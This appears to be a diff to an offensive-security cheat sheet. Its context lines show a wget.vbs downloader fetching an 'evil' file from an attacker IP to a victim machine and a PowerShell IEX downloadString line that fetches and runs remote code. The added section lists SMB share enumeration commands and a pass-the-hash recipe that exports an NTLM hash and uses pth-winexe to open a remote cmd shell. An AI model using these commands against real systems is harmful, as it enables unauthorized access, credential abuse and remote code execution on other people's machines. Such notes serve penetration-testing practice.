@@ -49,6 +49,23 @@ cscript wget.vbs(Echo the file to the victim machine) http://10.1.2.111:8000/evi
 IEX(New-Object Net.Webclient)downloadString(http://x.x.x.x/file)
 
 
+**SMB**
+
+smbclient -L <IP> # to list shares
+
+smbclient //x.x.x.x/sharename # to log into the share
+
+smbmap -H <IP> # to list shares and display read/write permissions.
+
+**PASS The HASH**
+
+1 .Take the NTLM hash and export it as:
+ export SMBHASH=<<<<<<<<<<<<<<NTLM HASH HERE>>>>>>>>>>>>>>>>>>
+
+2. run the command:
+pth-winexe -U <USER>% //x.x.x.x cmd
+    
+    
 
 
 
